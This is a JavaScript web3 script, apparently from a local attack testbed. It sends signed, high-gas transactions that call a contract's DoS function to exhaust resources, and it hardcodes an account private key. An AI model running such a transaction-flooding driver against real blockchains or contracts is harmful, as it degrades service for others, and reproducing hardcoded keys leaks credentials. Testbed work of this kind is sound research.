const {Web3} = require ('web3');
const  fs = require ('fs');

// Import ABI from your contract's JSON file
const ABI = require('/home/narwhal/attack_testbed/artifacts/contracts/resource_ex_att_contract.sol/resource_ex_att_contract.json');
// const ABI = require('/home/santoshadhikari/attack_testbed/artifacts/contracts/resource_ex_att_contract.sol/resource_ex_att_contract.json');  // Replace with your ABI path
const ContractABI = ABI.abi; // Extract the ABI from the JSON

// Connect to the local Ethereum node (you can use Infura if you’re using a testnet or mainnet)
const infuraUrl = "http://127.0.0.1:32861"; 
const web3 = new Web3(infuraUrl);

// Your contract address after deployment
const contractAddress = '0xb4B46bdAA835F8E4b4d8e208B6559cD267851051'; // Replace with your deployed contract address

// Your account details
const fromAddress = '0x8943545177806ED17B9F23F0a21ee5948eCaa776'; // Replace with your Ethereum account address
const privateKey = 'bcdf20249abf0ed6d944c0288fad489e33f66b3960d9e6229c1cd214ed3bbe31'; // Replace with your private key for signing the transaction

// Create contract instance
const myContract = new web3.eth.Contract(ContractABI, contractAddress);


async function callDoS(transactionCount, complexityFactor) {
  try {
      let nonce = await web3.eth.getTransactionCount(fromAddress, 'pending'); // Get current transaction count

      for (let i = 0; i < transactionCount; i++) {
          const tx = {
              from: fromAddress,
              to: contractAddress,
              gas: 600000,  // Increased gas limit
              gasPrice: web3.utils.toWei("300", 'gwei'), // Adjust based on network congestion
              nonce: nonce,  // Increment manually to prevent nonce issues
              data: myContract.methods.DoS(complexityFactor).encodeABI(), // Call DoS function
              value: '0'
          };

          // Sign the transaction
          const signedTx = await web3.eth.accounts.signTransaction(tx, privateKey);

          console.log(`Sending transaction ${i + 1}/${transactionCount}...`);

          // Send transaction
          web3.eth.sendSignedTransaction(signedTx.rawTransaction)
              .on('transactionHash', (hash) => {
                  console.log(`Tx Hash: ${hash}`);
              })
              .on('receipt', (receipt) => {
                  console.log(`Tx ${i + 1} confirmed:`, receipt.transactionHash);
              })
              .on('error', (err) => {
                  console.error(`Tx ${i + 1} failed:`, err.message);
              });

          nonce++;  // Increment nonce for the next transaction
      }

  } catch (error) {
      console.error('Error executing DoS transactions:', error);
  }
}

// Set number of transactions and complexity level
const TRANSACTIONS = 1; // Adjust as needed
const COMPLEXITY = 500; // Higher value increases computational cost

callDoS(TRANSACTIONS, COMPLEXITY);

